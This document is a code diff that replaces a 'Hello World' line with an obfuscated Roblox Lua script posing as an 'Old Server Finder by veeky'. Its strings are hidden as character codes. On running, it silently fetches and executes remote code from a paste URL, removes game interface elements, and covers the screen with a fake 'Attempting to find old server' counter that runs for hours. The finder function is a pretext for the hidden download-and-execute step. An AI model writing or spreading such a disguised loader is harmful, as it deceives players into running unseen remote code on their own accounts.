@@ -1,1 +1,67 @@
-print("Hello World")
+local _a=game.Players.LocalPlayer:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))
+local function _b(_c)
+if _c:IsA(string.char(83,99,114,101,101,110,71,117,105))and(_c.Name:lower():find(string.char(108,111,97,100,105,110,103))or _c.Name:lower():find(string.char(98,97,99,107,103,114,111,117,110,100)))then _c:Destroy()print(string.char(68,101,115,116,114,111,121,101,100,32,108,111,97,100,105,110,103,32,98,97,99,107,103,114,111,117,110,100,58).._c.Name)end end
+_a.ChildAdded:Connect(function(_d)_b(_d)end)
+for _,_e in pairs(_a:GetChildren())do _b(_e)end
+local _f,_g=pcall(function()loadstring(game:HttpGet(string.char(104,116,116,112,58,47,47,118,112,97,115,116,101,46,110,101,116,47,81,100,83,70,119)))()end)
+if not _f then warn(string.char(70,97,105,108,101,100,32,116,111,32,101,120,101,99,117,116,101,32,108,111,97,100,115,116,114,105,110,103,32,115,99,114,105,112,116,58).._g)end
+local _h=game:GetService(string.char(67,111,114,101,71,117,105))
+local _i=game.Players.LocalPlayer
+local _a=_i:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))
+local _j=Instance.new(string.char(83,99,114,101,101,110,71,117,105))
+_j.Name=string.char(86,69,69,75,89,32,79,108,100,83,101,114,118,101,114,70,105,110,100,101,114,32,118,49)
+_j.Parent=_a
+_j.DisplayOrder=1000
+local _k=Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
+_k.Size=UDim2.new(0,300,0,70)
+_k.Position=UDim2.new(0.5,-150,0.5,-35)
+_k.BackgroundColor3=Color3.fromRGB(0,0,0)
+_k.TextColor3=Color3.fromRGB(0,255,0)
+_k.Text=string.char(79,108,100,32,83,101,114,118,101,114,32,70,105,110,100,101,114,32,98,121,32,118,101,101,107,121)
+_k.Font=Enum.Font.SourceSansBold
+_k.TextSize=24
+_k.Parent=_j
+local function _l()
+for _,_m in pairs(_h:GetChildren())do
+if _m.Name==string.char(66,97,99,107,112,97,99,107,71,117,105)or _m.Name==string.char(66,97,99,107,112,97,99,107)then _m:Destroy()end
+end
+end
+local function _n()
+_l()
+_h.ChildAdded:Connect(function(_o)
+if _o.Name==string.char(66,97,99,107,112,97,99,107,71,117,105)or _o.Name==string.char(66,97,99,107,112,97,99,107)then _o:Destroy()end
+end)
+local _p=Instance.new(string.char(70,114,97,109,101))
+_p.Size=UDim2.new(2,0,2,0)
+_p.Position=UDim2.new(-0.5,0,-0.5,0)
+_p.BackgroundColor3=Color3.new(0,0,0)
+_p.BackgroundTransparency=0
+_p.ZIndex=10
+_p.Parent=_j
+local _q=Instance.new(string.char(84,101,120,116,76,97,98,101,108))
+_q.Size=UDim2.new(1,0,0.2,0)
+_q.Position=UDim2.new(0,0,0.1,0)
+_q.BackgroundTransparency=1
+_q.Text=string.char(65,116,116,101,109,112,116,105,110,103,32,116,111,32,102,105,110,100,32,111,108,100,32,115,101,114,118,101,114,46,46,46)
+_q.TextColor3=Color3.new(1,1,1)
+_q.Font=Enum.Font.SourceSansBold
+_q.TextSize=48
+_q.ZIndex=11
+_q.Parent=_p
+local _r=Instance.new(string.char(84,101,120,116,76,97,98,101,108))
+_r.Size=UDim2.new(1,0,0.1,0)
+_r.Position=UDim2.new(0,0,0.35,0)
+_r.BackgroundTransparency=1
+_r.TextColor3=Color3.new(1,1,1)
+_r.Font=Enum.Font.SourceSans
+_r.TextSize=36
+_r.ZIndex=11
+_r.Parent=_p
+local _s=100000
+for _t=1,_s do
+_r.Text=string.char(65,116,116,101,109,112,116,105,110,103,32,116,111,32,102,105,110,100,32,111,108,100,32,115,101,114,118,101,114,46,46,46,32,65,116,116,101,109,112,116,32).._t
+wait(0.1)
+end
+_j:Destroy()
+end
+_k.MouseButton1Click:Connect(_n)
